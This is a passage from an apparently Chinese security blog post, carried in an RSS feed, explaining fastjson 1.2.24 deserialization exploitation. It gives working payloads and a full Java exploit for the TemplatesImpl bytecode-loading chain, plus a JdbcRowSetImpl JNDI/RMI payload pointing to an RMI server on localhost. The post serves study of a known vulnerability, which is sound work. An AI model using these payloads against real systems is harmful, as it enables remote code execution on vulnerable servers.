&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;com.unboundid&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;unboundid-ldapsdk&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;4.0.9&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;commons-io&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;commons-io&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;2.5&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;1.2.24&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;commons-codec&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;commons-codec&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;1.12&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;主要有两条攻击的链子，一条是基于 TemplatesImpl 的链子，另一条是基于 JdbcRowSetImpl 的链子。&lt;/p&gt;
&lt;h2 id=&#34;templatesimpl利用链&#34;&gt;TemplatesImpl利用链
&lt;/h2&gt;&lt;p&gt;在前面cc3链的时候,利用的就是TemplatesImpl利用链,通过类加载器来执行恶意命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TemplatesImpl.getTransletInstance()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  TemplatesImpl.defineTransletClasses()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    TemplatesImpl.defineClass()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ClassLoader.defineClass()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        newInstance
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;前面需要一层层调用到&lt;code&gt;getTransletInstance()&lt;/code&gt;方法,而如果fastjson可以直接调用&lt;code&gt;getTransletInstance()&lt;/code&gt;方法,那么就省去前面的链子调用了&lt;/p&gt;
&lt;p&gt;而刚好&lt;code&gt;getTransletInstance()&lt;/code&gt;是一个&lt;code&gt;getter&lt;/code&gt;方法,但是getter方法调用是有条件的&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;满足条件的getter：&lt;/font&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非静态方法&lt;/li&gt;
&lt;li&gt;无参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而这个方法返回的是抽象类,不满足条件&lt;/p&gt;
&lt;p&gt;寻找调用这个方法&lt;/p&gt;
&lt;p&gt;往上找到&lt;code&gt;newTransformer&lt;/code&gt;,继续找&lt;/p&gt;
&lt;p&gt;找到&lt;code&gt;getOutputProperties&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回的是Properties类,继承了HashMap,自然继承了Map&lt;/p&gt;
&lt;p&gt;满足条件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getOutputProperties-&amp;gt;newTransformer-&amp;gt;getTransletInstance
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;final String evilClassPath = &amp;#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;final String NASTY_CLASS = &amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String text1 = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;&amp;#34; + NASTY_CLASS +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;\&amp;#34;,\&amp;#34;_bytecodes\&amp;#34;:[\&amp;#34;&amp;#34;+evilCode+&amp;#34;\&amp;#34;],&amp;#39;_name&amp;#39;:&amp;#39;Drunkbaby&amp;#39;,&amp;#39;_tfactory&amp;#39;:{ },\&amp;#34;_outputProperties\&amp;#34;:{ },&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;不需要通过反射来修改,直接json字符串修改即可&lt;/p&gt;
&lt;p&gt;完整exp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ByteArrayOutputStream bos = new ByteArrayOutputStream();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        IOUtils.copy(new FileInputStream(new File(cls)), bos);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    } catch (IOException e) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        e.printStackTrace();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    return Base64.encodeBase64String(bos.toByteArray());
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public static void main(String[] args) throws  Exception{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    final String fileSeparator = System.getProperty(&amp;#34;file.separator&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    final String evilClassPath = &amp;#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    String evilCode = readClass(evilClassPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ParserConfig config = new ParserConfig();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    final String NASTY_CLASS = &amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    String text1 = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;&amp;#34; + NASTY_CLASS +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;#34;\&amp;#34;,\&amp;#34;_bytecodes\&amp;#34;:[\&amp;#34;&amp;#34;+evilCode+&amp;#34;\&amp;#34;],&amp;#39;_name&amp;#39;:&amp;#39;Drunkbaby&amp;#39;,&amp;#39;_tfactory&amp;#39;:{ },\&amp;#34;_outputProperties\&amp;#34;:{ },&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    System.out.println(text1);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Object obj  = JSON.parseObject(text1,Object.class,config, Feature.SupportNonPublicField);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;evilCode&lt;/code&gt;传入的是base64编码的数据,但是动态加载类不会解码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733057053004-61041bc0-70da-4f4d-9ae2-873b12e3282c.png&#34;
	width=&#34;966&#34;
	height=&#34;510&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733057053004-61041bc0-70da-4f4d-9ae2-873b12e3282c_hua7a44e967b0c589b651ed8ef46929eae_66280_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733057053004-61041bc0-70da-4f4d-9ae2-873b12e3282c_hua7a44e967b0c589b651ed8ef46929eae_66280_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;189&#34;
		data-flex-basis=&#34;454px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到传入到&lt;code&gt;_bytecodes&lt;/code&gt;已经变成字节码数组了&lt;/p&gt;
&lt;p&gt;说明base64解码在动态加载前就已经解码过了&lt;/p&gt;
&lt;p&gt;根据GPT所说&lt;/p&gt;
&lt;p&gt;Base64 数据的解码不是动态加载完成的，而是 &lt;strong&gt;JSON 库（如 FastJSON）在解析过程中完成的&lt;/strong&gt;。JSON 库解析时，根据字段的类型（如 &lt;code&gt;byte[][]&lt;/code&gt;），会将 Base64 编码的字符串转换为实际的字节数据。&lt;/p&gt;
&lt;h2 id=&#34;基于-jdbcrowsetimpl-的利用链&#34;&gt;基于 JdbcRowSetImpl 的利用链
&lt;/h2&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;基于 JdbcRowSetImpl 的利用链主要有两种利用方式，即 JNDI + RMI 和 JNDI + LDAP，都是属于基于 Bean Property 类型的 JNDI 的利用方式。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-jndi--rmi&#34;&gt;1. JNDI + RMI
&lt;/h3&gt;&lt;p&gt;利用的是&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;类下的&lt;code&gt;setDataSourceName&lt;/code&gt;方法,用的是JNDI注入的Reference&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;#34;@type&amp;#34;:&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;#34;dataSourceName&amp;#34;:&amp;#34;rmi://localhost:1099/Exploit&amp;#34;, &amp;#34;autoCommit&amp;#34;:true
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;看代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061413744-d8407a51-d34d-416d-837e-b12613939fcf.png&#34;
	width=&#34;708&#34;
	height=&#34;376&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061413744-d8407a51-d34d-416d-837e-b12613939fcf_huba2e8c97fec4aeef3cbfeb26b77e0069_37789_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061413744-d8407a51-d34d-416d-837e-b12613939fcf_huba2e8c97fec4aeef3cbfeb26b77e0069_37789_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;451px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;设置数据源,&lt;code&gt;getter&lt;/code&gt;方法,满足fastjson反序列化调用的条件&lt;/p&gt;
&lt;p&gt;再看&lt;code&gt;setAutoCommit&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061812591-0f7a1ef5-b1ba-43eb-a989-8df764d2a158.png&#34;
	width=&#34;744&#34;
	height=&#34;221&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061812591-0f7a1ef5-b1ba-43eb-a989-8df764d2a158_hua5fb97f1af1bc3167eb227f1bf797068_27068_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061812591-0f7a1ef5-b1ba-43eb-a989-8df764d2a158_hua5fb97f1af1bc3167eb227f1bf797068_27068_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;336&#34;
		data-flex-basis=&#34;807px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;跟进connect方法可以看到&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061822639-a0f627a1-13ef-4065-91c6-d990c51534fe.png&#34;
	width=&#34;911&#34;
	height=&#34;202&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061822639-a0f627a1-13ef-4065-91c6-d990c51534fe_huee34f04362fbf9ccc61102e5e9bb4b79_28297_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061822639-a0f627a1-13ef-4065-91c6-d990c51534fe_huee34f04362fbf9ccc61102e5e9bb4b79_28297_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;450&#34;
		data-flex-basis=&#34;1082px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;InitialContext var1 = new InitialContext();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;和JNDI注入时十分相似&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061877893-37a0a1ef-12d9-4715-80b4-5c02a96e9fe2.png&#34;
	width=&#34;877&#34;
	height=&#34;88&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061877893-37a0a1ef-12d9-4715-80b4-5c02a96e9fe2_hu42bfe0c3f9ddd2f795896a46cccf1c9e_13983_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061877893-37a0a1ef-12d9-4715-80b4-5c02a96e9fe2_hu42bfe0c3f9ddd2f795896a46cccf1c9e_13983_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;996&#34;
		data-flex-basis=&#34;2391px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;而且&lt;code&gt;getDataSourceName()&lt;/code&gt;返回&lt;code&gt;dataSourceName&lt;/code&gt;值是我们可控的&lt;/p&gt;
&lt;p&gt;用yakit的工具&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061952772-7583859e-4638-4bc5-aef5-ba9a515cedc2.png&#34;
	width=&#34;1121&#34;
	height=&#34;430&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061952772-7583859e-4638-4bc5-aef5-ba9a515cedc2_hu54cc24fcb83996f7fa2707d14daeeac6_61660_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061952772-7583859e-4638-4bc5-aef5-ba9a515cedc2_hu54cc24fcb83996f7fa2707d14daeeac6_61660_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;260&#34;
		data-flex-basis=&#34;625px&#34;
	
&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061979773-1be67368-5633-46af-bdf1-de5bc82b04d3.png&#34;
	width=&#34;1056&#34;
	height=&#34;661&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061979773-1be67368-5633-46af-bdf1-de5bc82b04d3_huec38d522764e72363d5b71f04ef049ac_47685_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/1733061979773-1be67368-5633-46af-bdf1-de5bc82b04d3_huec38d522764e72363d5b71f04ef049ac_47685_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;159&#34;
		data-flex-basis=&#34;383px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;弹成功&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
